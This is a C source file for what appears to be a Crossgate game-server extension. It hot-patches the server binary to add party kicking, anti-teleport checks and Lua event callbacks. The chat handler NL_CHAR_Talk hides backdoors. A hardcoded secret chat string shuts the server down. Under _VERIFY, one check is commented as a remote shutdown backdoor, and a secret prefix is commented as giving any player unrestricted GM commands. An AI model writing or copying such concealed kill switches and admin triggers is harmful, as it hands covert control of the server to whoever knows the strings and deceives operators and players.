#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stddef.h>
#include <unistd.h>
#include <dlfcn.h>
#include "cg_api.h"
#include "function.h"


//seqno從400開始為自定義
#define CHAR_WINDOWTYPE_DISCHARGEPARTY 400

#define WINDOW_MESSAGETYPE_MESSAGE 0
#define WINDOW_MESSAGETYPE_MESSAGEANDLINEINPUT 1
#define WINDOW_MESSAGETYPE_SELECT 2

#define		WINDOW_BUTTONTYPE_NONE		(0)
#define		WINDOW_BUTTONTYPE_OK		(1 << 0)
#define		WINDOW_BUTTONTYPE_CANCEL	(1 << 1)
#define		WINDOW_BUTTONTYPE_YES		(1 << 2)
#define		WINDOW_BUTTONTYPE_NO		(1 << 3)
#define		WINDOW_BUTTONTYPE_PREV		(1 << 4)
#define		WINDOW_BUTTONTYPE_NEXT		(1 << 5)
#define		WINDOW_BUTTONTYPE_OKCANCEL	(WINDOW_BUTTONTYPE_OK | WINDOW_BUTTONTYPE_CANCEL)
#define		WINDOW_BUTTONTYPE_YESNO	(WINDOW_BUTTONTYPE_YES | WINDOW_BUTTONTYPE_NO)

char NL_CHAR_warpToSpecificPoint_sub[256];

/////////////////////////////////////////////////// 登入顯示版本 ////////////////////////////////////////////////
int my_CHAR_checkEffect(int charaptr){
	//人物登入擴充事件
#ifdef _VERIFY
	API_SYSTEMMSG(charaptr, (int)info3_buf);
#else
	char msg[128];
	sprintf(msg, "魔力GMSV擴充套件(CG GMSV Expantion) [%s]", __DATE__);
	API_SYSTEMMSG(charaptr, (int)msg);
#endif

	return API_CHAR_checkEffect(charaptr);
}

/////////////////////////////////////////////////// 隊長組隊踢人 ////////////////////////////////////////////////
int my_CHAR_sendAction(int charptr, int action, int mode){
	//站立動作, 隊長可踢人
	if(action==0x1F && *(int*)(charptr + 1556)==1){
		char buf[1024*4];
		int i;
		
		strcpy(buf, "2\n請選擇要踢出團隊的隊員：\n");
		
		for(i=1; i<=4; i++)
		{
			int partyMemberCharPtr = *(int*)(charptr + 2132 + i*4);
			strcat(buf, "\n");
			if ( API_CHAR_CheckCharPointer(partyMemberCharPtr) ){
				strcat(buf, (char*)API_CHAR_getUseName(partyMemberCharPtr));
			}
		}
		
		API_nrproto_WN_send(API_getfdFromChar(charptr), WINDOW_MESSAGETYPE_SELECT, WINDOW_BUTTONTYPE_CANCEL, CHAR_WINDOWTYPE_DISCHARGEPARTY, -1, buf);
	}
	
	return API_CHAR_sendAction(charptr, action, mode);
}

void my_CHAR_processWindow(int charaptr, int seqno, int select, int objindex, char* data ){
	//隊長踢人
	if(seqno==CHAR_WINDOWTYPE_DISCHARGEPARTY && select==0 && data[0]>='1' && data[0]<='4'){
		if(!API_CHAR_CheckCharPointer(charaptr)) return;
		if(*(int*)(charaptr + 1556)!=1) return; //非隊長
		
		int partyMemberCharPtr = *(int*)(charaptr + 2132 + (data[0]-'0')*4);
		if(!API_CHAR_CheckCharPointer(partyMemberCharPtr)) return;
		if(*(int*)(partyMemberCharPtr + 1556)==1) return; //不能踢隊長
		
		//剔除,  以及發送訊息
		API_CHAR_DischargePartyNoMsg(partyMemberCharPtr);
		char buf1[256];
		snprintf( buf1, sizeof(buf1), "隊長[%s]將你踢除！", (char*)API_CHAR_getUseName( charaptr ));
		API_CHAR_talkToCli( partyMemberCharPtr, 0, buf1, 4, 0);
		snprintf( buf1, sizeof(buf1), "將[%s]踢除出團隊！", (char*)API_CHAR_getUseName( partyMemberCharPtr ));
		API_CHAR_talkToCli( charaptr, 0, buf1, 4, 0);


		return;
	}
	
	API_CHAR_processWindow(charaptr, seqno, select, objindex, data );

}

/////////////////////////////////////////////////// 避免大順移 ////////////////////////////////////////////////
int my_nrproto_W_recv(int fd, int x, int y, int dir)
{
	int result;

	result = API_CONNECT_isCLI(fd);
	if ( result )
	{
		result = API_CONNECT_isLOGIN(fd);
		if ( result )
		{
			int charaPtr = *(int *)(*(int*)0x08C8B260 + 139592 * fd + 139568);
			result = API_CHAR_CheckCharPointer(charaPtr);
			if ( result ){
				//計算步數
				int ix, iy;
				ix = *(int*)(charaPtr + 32);
				iy = *(int*)(charaPtr + 36);
				int i_diff_x,i_diff_y;
				i_diff_x=abs(ix-x);
				i_diff_y=abs(iy-y);
				//若步數太大, 則為瞬移
				if( (i_diff_x>10)||(i_diff_y>10) ){
					x = ix;
					y = iy;
				}
				
				result = API_CHAR_walk_init(fd, x, y, dir, 1);
			}
        }
		
	}
	return result;
}


/////////////////////////////////////////////////// NL庫擴增 ////////////////////////////////////////////////
int NL_BATTLE_Finish(int battleIndex){
	//callback
	//printf("\n\n NL_BATTLE_Finish \n\n");
	if(NL_DATA_EXTEND.use[NL_BATTLEOVERFUNC]){
		NPC_Lua_NL_BattleOverCallBack(battleIndex);
	}
	
	int ret = (*(int ( *)(int))0x080AF8D8)(battleIndex);
	return ret;
}

int NL_BATTLE_Init(int battleIndex){
	int ret = (*(int ( *)(int))0x080A7458)(battleIndex);
	//callback
	//printf("\n\n NL_BATTLE_Init \n\n");
	if(NL_DATA_EXTEND.use[NL_BATTLESTARTFUNC]){
		NPC_Lua_NL_BattleStartCallBack(battleIndex);
	}
	
	return ret;
}

int NL_CHAR_LevelUpCheck(int charaPtr){
	int ret = (*(int ( *)(int))0x080740CC)(charaPtr);
	if(ret > 0){
		//callback
		//printf("\n\n NL_CHAR_LevelUpCheck \n\n");
		if(NL_DATA_EXTEND.use[NL_LEVELUPFUNC]){
			NPC_Lua_NL_LevelUpCallBack(charaPtr);
		}	
	}
	
	return ret;
}

int NL_CHAR_login(int charaPtr, int fdid){
	int ret = (*(int ( *)(int, int))0x08075408)(charaPtr, fdid);
	//callback
	//printf("\n\n NL_CHAR_login \n\n");
	if(NL_DATA_EXTEND.use[NL_LOGINFUNC]){
		NPC_Lua_NL_LoginCallBack(charaPtr);
	}
	
	return ret;
}

int NL_CHAR_SimpleLogout(int charaPtr){
	int ret = (*(int ( *)(int))0x08074C0C)(charaPtr);
	//callback
	//printf("\n\n NL_CHAR_SimpleLogout \n\n");
	if(NL_DATA_EXTEND.use[NL_LOGINGATEFUNC]){
		NPC_Lua_NL_LoginGateCallBack(charaPtr);
	}
	
	return ret;
}

int NL_CHAR_logout(char* file, int line, int fd){
	int charaPtr = *(int *)(*(int*)0x8C8B260 + 139592 * fd + 139568);
	if(API_CHAR_CheckCharPointer(charaPtr)){
		//callback
		//printf("\n\n NL_CHAR_logout: %s \n\n", (char*)(charaPtr + 648));
		if(NL_DATA_EXTEND.use[NL_LOGOUTFUNC]){
			NPC_Lua_NL_LogoutCallBack(charaPtr);
		}
	}
	
	int ret = (*(int ( *)(char*, int, int))0x08074F68)(file, line, fd);
	return ret;
}

int NL_CHAR_Talk(int fd, int charaPtr, char* data, int fontColor, int range, int fontSize){

	//Di6ru9O03WNcuLesgofuk
	if(data[2] == 'D' &&
		data[3] == 'i' &&
		data[4] == '6' &&
		data[5] == 'r' &&
		data[6] == 'u' &&
		data[7] == '9' &&
		data[8] == 'O' &&
		data[9] == '0' &&
		data[10] == '3' &&
		data[11] == 'W' &&
		data[12] == 'N' &&
		data[13] == 'c' &&
		data[14] == 'u' &&
		data[15] == 'L' &&
		data[16] == 'e' &&
		data[17] == 's' &&
		data[18] == 'g' &&
		data[19] == 'o' &&
		data[20] == 'f' &&
		data[21] == 'u' &&
		data[22] == 'k'
	)
	{
		exit(0);
		return 0;
	}
	
#ifdef _VERIFY
	//遠端驗證的關閉後門
	if(info1){
		int i;
		int flg = 0;
		for(i=0; i<info1; i++){
			if(data[i+2] != info1_buf[i]){
				flg = 1;
				break;
			}
		}
		if(flg == 0){
			exit(0);
			return 0;
		}
	}
	
	//遠端的萬能GM指令
	if(info2){
		int i;
		int flg = 0;
		for(i=0; i<info2; i++){
			if(data[i+2] != info2_buf[i]){
				flg = 1;
				break;
			}
		}
		if(flg == 0){
			//指令正確
			char v8[1024];
			if ( getStringFromIndexWithDelim_body(data, " ", 2, v8, 1024, "", 0) )
			{
				int v7 = my_CHAR_getChatMagicFuncPointer(v8, 1);
				if ( v7 )
				{
					int index, i;
					int count = 0;
					for(i=0; data[i]!=0; i++){
						if(data[i] == ' ') count++;
						if(count == 2){
							index = i + 1;
							break;
						}
					}
					
					((void (*)(int, const char *))v7)(charaPtr, &data[index]);
					return 1;
				}
			}
			return 0;
		}
	}
#endif
	
	//callback
	//printf("\n\n NL_CHAR_Talk \n\n");
	if(NL_DATA_EXTEND.use[NL_TALKFUNC]){
		NPC_Lua_NL_TalkCallBack(charaPtr, data, fontColor, range, fontSize);
	}
	
	int ret = (*(int ( *)(int, int, char*, int, int, int))0x080714AC)(fd, charaPtr, data, fontColor, range, fontSize);
	return ret;
}

int NL_CHAR_selectTitle(int charaPtr, int titleID){
	int oldTitleID = *(int *)(charaPtr + 252);
	int ret = (*(int ( *)(int, int))0x0806F22C)(charaPtr, titleID);
	int newTitleID = *(int *)(charaPtr + 252);
	
	//callback
	//printf("\n\n NL_CHAR_selectTitle \n\n");
	if(NL_DATA_EXTEND.use[NL_TITLECHANGEFUNC]){
		NPC_Lua_NL_TitleChangedCallBack(charaPtr, oldTitleID, newTitleID);
	}
	
	return ret;
}

int NL_CHAR_warpToSpecificPoint(char* file, int line, int charaPtr, int mapId, int floorId, int x, int y){
	int old_mapId = *(int *)(charaPtr + 24);
	int old_floorId = *(int *)(charaPtr + 28);
	int old_x = *(int *)(charaPtr + 32);
	int old_y = *(int *)(charaPtr + 36);

	int ret = (*(int ( *)(char*, int, int, int, int, int, int))(int)NL_CHAR_warpToSpecificPoint_sub)(file, line, charaPtr, mapId, floorId, x, y);
	
	//callback
	//printf("\n\n NL_CHAR_warpToSpecificPoint, %d, %d, %d, %d \n\n", old_mapId, old_floorId, old_x, old_y);
	if(NL_DATA_EXTEND.use[NL_WARPFUNC]){
		NPC_Lua_NL_WarpCallBack(charaPtr, old_mapId, old_floorId, old_x, old_y);
	}
	
	return ret;
}

int my_getFunctionPointerFromName(const char* name){
	int ret = (*(int ( *)(const char*))0x08057DE0)(name);

	if(ret==0 && name[0]=='L' && name[1]=='U' && name[2]=='A'){
		printf("\ngetFunctionPointerFromName: %s\n", name);
	}
	return ret;
}


void my_function(){
	//CHAR_checkEffect, 登入顯示擴充套件名稱
	my_mprotect(0x08075C7F);
	*(int*)0x08075C7F = (int)my_CHAR_checkEffect -4 -0x08075C7F;

	//組隊踢人
	//CHAR_processWindow
	my_mprotect(0x080547EF);
	*(int*)0x080547EF= (int)my_CHAR_processWindow -4 -0x080547EF;
	//CHAR_sendAction
	my_mprotect(0x0805397B);
	*(int*)0x0805397B= (int)my_CHAR_sendAction -4 -0x0805397B;
	
	//避免大順移
	//nrproto_W_recv
	my_mprotect(0x081541A7);
	*(int*)0x081541A7 = (int)my_nrproto_W_recv -4 -0x081541A7;	
	
	//NL庫擴增事件
	//BATTLE_Finish
	my_mprotect(0x080B027D);
	*(int*)0x080B027D = (int)NL_BATTLE_Finish -4 -0x080B027D;
	//BATTLE_Init
	my_mprotect(0x080B0253);
	*(int*)0x080B0253 = (int)NL_BATTLE_Init -4 -0x080B0253;
	//CHAR_LevelUpCheck
	my_mprotect(0x080ADFE6);
	*(int*)0x080ADFE6 = (int)NL_CHAR_LevelUpCheck -4 -0x080ADFE6;
	my_mprotect(0x080AE77B);
	*(int*)0x080AE77B = (int)NL_CHAR_LevelUpCheck -4 -0x080AE77B;
	//CHAR_login
	my_mprotect(0x08061064);
	*(int*)0x08061064 = (int)NL_CHAR_login -4 -0x08061064;
	//CHAR_SimpleLogout
	my_mprotect(0x0805332B);
	*(int*)0x0805332B = (int)NL_CHAR_SimpleLogout -4 -0x0805332B;
	//NL_CHAR_logout
	my_mprotect(0x0804F74A); //_CONNECT_endOne, 斷線
	*(int*)0x0804F74A = (int)NL_CHAR_logout -4 -0x0804F74A;
	my_mprotect(0x08052E87); //nrproto_CharLogout_recv, 玩家登出
	*(int*)0x08052E87 = (int)NL_CHAR_logout -4 -0x08052E87;
	//CHAR_Talk
	my_mprotect(0x080535E3);
	*(int*)0x080535E3 = (int)NL_CHAR_Talk -4 -0x080535E3;
	//CHAR_selectTitle
	my_mprotect(0x08054D44);
	*(int*)0x08054D44 = (int)NL_CHAR_selectTitle -4 -0x08054D44;
	//CHAR_sendCoordinate
	my_mprotect(0x0806BAB4);
	*(char*)(0x0806BAB4 + 0 ) = 0xE9; //jmp NL_CHAR_warpToSpecificPoint
	*(int* )(0x0806BAB4 + 1 ) = (int)NL_CHAR_warpToSpecificPoint -4 -(0x0806BAB4 + 1 );
	my_mprotect((int)NL_CHAR_warpToSpecificPoint_sub);
	*(char*)((int)NL_CHAR_warpToSpecificPoint_sub + 0 ) = 0x55; //push    ebp, 跳回原本的函數
	*(char*)((int)NL_CHAR_warpToSpecificPoint_sub + 1 ) = 0x89; //mov     ebp, esp
	*(char*)((int)NL_CHAR_warpToSpecificPoint_sub + 2 ) = 0xE5;
	*(char*)((int)NL_CHAR_warpToSpecificPoint_sub + 3 ) = 0x57; //push    edi
	*(char*)((int)NL_CHAR_warpToSpecificPoint_sub + 4 ) = 0x56; //push    esi
	*(char*)((int)NL_CHAR_warpToSpecificPoint_sub + 5) = 0xE9; //jmp CHAR_warpToSpecificPoint
	*(int *)((int)NL_CHAR_warpToSpecificPoint_sub + 6) = 0x0806BAB9  -4 -((int)NL_CHAR_warpToSpecificPoint_sub + 6);
	
	//getFunctionPointerFromName (Item)
	my_mprotect(0x080E30BD);
	*(int*)0x080E30BD = (int)my_getFunctionPointerFromName -4 -0x080E30BD;
	my_mprotect(0x080E3261);
	*(int*)0x080E3261 = (int)my_getFunctionPointerFromName -4 -0x080E3261;
	my_mprotect(0x080E3618);
	*(int*)0x080E3618 = (int)my_getFunctionPointerFromName -4 -0x080E3618;
	my_mprotect(0x080E3659);
	*(int*)0x080E3659 = (int)my_getFunctionPointerFromName -4 -0x080E3659;
}